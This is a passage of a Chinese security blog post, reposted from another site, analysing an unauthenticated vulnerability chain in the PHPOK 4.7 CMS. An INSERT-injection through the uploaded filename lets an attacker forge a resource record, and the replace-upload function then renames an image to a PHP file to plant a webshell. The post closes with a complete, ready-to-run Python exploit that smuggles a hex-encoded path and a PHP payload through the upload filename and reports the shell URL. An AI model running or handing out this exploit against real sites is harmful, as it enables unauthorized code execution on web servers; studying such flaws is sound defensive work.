if($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;])&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;cate[&apos;filetypes&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;file_type)&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;file_type;</span><br><span class="line">        &#125;</span><br><span class="line">        $list = explode(&quot;,&quot;,$filetypes);</span><br><span class="line">        $list = array_unique($list);</span><br><span class="line">        if(!in_array($ext,$list))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>上传是比较严格的，只允许上传后缀是jpg,png,gif这种图片后缀的文件，上传我们无法绕过，但是程序对于上传的文件名没有充份的过滤，在函数末尾，将文件名添加到了返回的数组中:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里的$tmpname就是我们上传的文件名，注意，不是上传后的文件名，而是上传前的文件名，并且没有对该文件名过滤，然后返回。</p>
+<p>我们回到开头，upload_base函数中去:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br></pre></td></tr></table></figure>
+<p>可以看到这里将返回值中的title的值赋值给了$array[‘title’],这个值是我们可控的，然后将$array带入到了save函数中，我们看一下该函数:</p>
+<p>在/framework/model/res.php中第279行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function save($data,$id=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>将$data带入到了insert_array函数中，我们看一下该函数:</p>
+<p>/framework/engine/db/mysqli.php中第211行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data,$tbl,$type=&quot;insert&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$tbl || !$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix)&#123;</span><br><span class="line">            $tbl = $this-&gt;prefix.$tbl;</span><br><span class="line">        &#125;</span><br><span class="line">        $type = strtolower($type);</span><br><span class="line">        $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;;</span><br><span class="line">        $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;;</span><br><span class="line">        $sql_fields = array();</span><br><span class="line">        $sql_val = array();</span><br><span class="line">        foreach($data AS $key=&gt;$value)&#123;</span><br><span class="line">            $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;;</span><br><span class="line">            $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">        return $this-&gt;insert($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>就是将该数组中的键值遍历出来，将键作为字段名，将值作为对应字段的值。可以看到，对于值是没有进行转义的，其中包括我们可以控制的title的值，那么这里就产生了一个insert的注入。那么这个注入我们有什么用呢？当然首先想到的是一个出数据，但是对于update 或者insert注入，一般来说我会想办法将这个注入升级一下危害。注意这个注入是一个insert注入，并且insert语句是可以一次插入多条内容的，我们不能控制当前这条insert语句的内容，我们可以控制下一条的内容，比如说像这样:<br>Insert into file values(1,2,3,),(4,5,6)<br>那么我们控制下一条的内容有什么用，好，现在我们开始看/framework/www/upload_control.php中的第103行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function replace_f()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;popedom();</span><br><span class="line">        $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;没有指定要替换的附件&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        if(!$old_rs)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;资源不存在&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;附件上传失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        $my_ext = array();</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))</span><br><span class="line">        &#123;</span><br><span class="line">            $img_ext = getimagesize($rs[&quot;filename&quot;]);</span><br><span class="line">            $my_ext[&quot;width&quot;] = $img_ext[0];</span><br><span class="line">            $my_ext[&quot;height&quot;] = $img_ext[1];</span><br><span class="line">        &#125;</span><br><span class="line">        //替换资源</span><br><span class="line">        $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);</span><br><span class="line">        $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time);</span><br><span class="line">        $tmp[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id);</span><br><span class="line">        //更新附件扩展信息</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $this-&gt;json($rs,true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们输入一个oldid的值，然后从res表中查找出这一行的数据，然后将我们上传的文件mv到$old_rs[‘filename’]。<br>mv函数的定义在/framework/libs/file.php中第264行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function mv($old,$new,$recover=true)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!file_exists($old))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($new,-1) == &quot;/&quot;)&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;dir&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(file_exists($new))&#123;</span><br><span class="line">            if($recover)&#123;</span><br><span class="line">                unlink($new);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $new = $new.basename($old);</span><br><span class="line">        &#125;</span><br><span class="line">        rename($old,$new);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>通过上文说到的，我们可以控制res表中的一行记录的值，那么这个filename也是我们可控的，那么我们如果将filename设置为/res/balisong.php。那么我上传的图片文件就会重新命名成/res/balisong.php。我们就达到了一个getshell的目的。</p>
+<p>由于上传的文件名的特殊性。导致我们不能带有斜杠，那么怎么办呢？我们可以利用十六进制编码来绕过，具体的漏洞利用过程就不细说了，比较复杂，所以直接上exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">\#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print u&quot;Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02&quot;</span><br><span class="line">    exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">phpses = sys.argv[2] if len(sys.argv) &gt; 2 else &apos;&apos;</span><br><span class="line">cookies = &#123;&apos;PHPSESSION&apos;: phpses&#125;</span><br><span class="line">if baseurl[-1] == &apos;/&apos;:</span><br><span class="line">    baseurl = baseurl[:-1]</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=save&apos;</span><br><span class="line">files = [</span><br><span class="line">    (&apos;upfile&apos;, (&quot;1&apos;,&apos;r7ip15ijku7jeu1s1qqnvo9gj0&apos;,&apos;30&apos;,&apos;&apos;),(&apos;1&apos;,0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,&apos;&apos;,0x7265732f62616c69736f6e672e706870,&apos;1495536080&apos;,&apos;2.jpg&quot;,</span><br><span class="line">                &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">files1 = [</span><br><span class="line">    (&apos;upfile&apos;,</span><br><span class="line">     (&apos;1.jpg&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">response = r.text</span><br><span class="line">id = re.search(&apos;&quot;id&quot;:&quot;(\d+)&quot;&apos;, response, re.S).group(1)</span><br><span class="line">id = int(id) + 1</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=replace&amp;oldid=%d&apos; % (id)</span><br><span class="line">r = requests.post(url, files=files1, cookies=cookies)</span><br><span class="line">shell = baseurl + &apos;/res/balisong.php&apos;</span><br><span class="line">response = requests.get(shell)</span><br><span class="line">if response.status_code == 200:</span><br><span class="line">    print &quot;congratulation:Your shell:\n%s\npassword:balisong&quot; % (shell)</span><br><span class="line">else:</span><br><span class="line">    print &quot;oh!Maybe failed.Please check&quot;</span><br></pre></td></tr></table></figure>
+<p>系统默认是不需要注册登录即可上传文件的。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实这种情况还是蛮多的，有些系统会将上传前的文件名入库，如果过滤不当，就可以注入了。并且insert，update这种注入危害是可以进一步扩大的。</p>
+<p>转载于<a href="https://xz.aliyun.com/t/1569/#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569/#toc-1</a></p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫">
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝"></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信"></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/12/07/PHPOK 4.7从注入到getshell/">PHPOK 4.7从注入到getshell</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 JYP 的个人博客">JYP</a></p>
+        <p><span>发布时间:</span>2019年12月07日 - 01时03分</p>
+        <p><span>最后更新:</span>2019年12月07日 - 01时50分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/12/07/PHPOK 4.7从注入到getshell/" title="PHPOK 4.7从注入到getshell">http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/　　作者: JYP" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2019/12/07/sql-dnslog/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          mysql-dns注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/12/07/oracle注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Oracle注入-报错注入</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'swing'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/12/07/sql-dnslog/" title="上一篇: mysql-dns注入">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/12/07/oracle注入/" title="下一篇: Oracle注入-报错注入">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/谈谈对后台登陆页面的渗透测试/">谈谈对后台登录页面的渗透测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/最新版wordpress任意文件删除漏洞复现/">最新版wordpress任意文件删除漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/利用竞争条件（Race Condition）对目标Web应用实现RCE/">利用竞争条件（Race Condition）对目标Web应用实现RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/windows创建隐藏用户/">windows创建隐藏用户</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/ThinkPHP5.x 路由缺陷导致远程代码执行/">ThinkPHP5.x 路由缺陷导致远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/">metinfo 6.2.0最新版本前台注入漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/CVE-2017-7269 IIS6.0远程代码执行漏洞复现/">CVE-2017-7269 IIS6.0远程代码执行漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/">【转]CSRF漏洞劫持Youtube用户的通知消息</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/漏洞搜集/犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)/">犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/漏洞搜集/WordPress存储型XSS漏洞分析/">WordPress存储型XSS漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/漏洞搜集/cve-20190-0708/">简单判断是否是cve-2019-0708攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/漏洞搜集/CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析/">CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/文件上传解析漏洞3/">文件上传解析漏洞——解析、验证、伪造（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/文件上传解析漏洞-解析、验证、伪造/">文件上传解析漏洞-解析、验证、伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/支付漏洞/">支付漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/平行越权、垂直越权/">平行越权、垂直越权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/变量覆盖/">变量覆盖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/zhengzebiaodashi/">正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/zhengze/">sql注入：显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/XXE-实体注入/">XXE-实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/XSS2/">存储型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/xss1/">xss原理与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/unserialize反序列化漏洞/">PHP unserialize反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/SSRF-服务器端请求伪造/">SSRF-服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sql注入--0day审计案例(2)/">sql注入--0day审计案例(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sql注入--0day审计案例(1)/">sql注入--0day审计案例(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sql_head/">head头注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sqlkzj/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sql2/">post注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sql1/">sql注入原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/sql-dnslog/">mysql-dns注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/PHPOK 4.7从注入到getshell/">PHPOK 4.7从注入到getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/oracle注入/">Oracle注入-报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/mysqlmanzu/">sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/mssql反弹注入/">mssql反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/domxss/">dosXSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/07/access/">access数据库之偏移注入</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2021 JYP
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
